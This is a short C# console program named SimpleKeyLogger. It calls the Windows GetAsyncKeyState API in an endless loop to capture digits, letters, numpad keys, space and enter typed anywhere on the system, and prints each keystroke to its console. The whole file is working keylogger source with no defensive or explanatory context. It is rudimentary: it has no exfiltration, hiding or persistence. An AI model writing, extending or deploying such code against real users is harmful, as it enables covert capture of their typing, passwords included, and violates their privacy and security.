using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SimpleKeyLogger
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        {
            List<int> charSet = new List<int>();
            for (int i = 48; i <= 57; i++) charSet.Add(i);
            for (int i = 65; i <= 90; i++) charSet.Add(i);
            for (int i = 96; i <= 105; i++) charSet.Add(i);
            charSet.Add(32);
            charSet.Add(13);

            while (true)
            {
                Thread.Sleep(100);

                foreach(int i in charSet)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == 32769)
                    {
                         if (i >= 96 && i <= 105)
                             Console.WriteLine((char)(i - 48));
                         else
                             Console.WriteLine((char)i);

                         break;
                    }
                }
            }
        }
    }
}
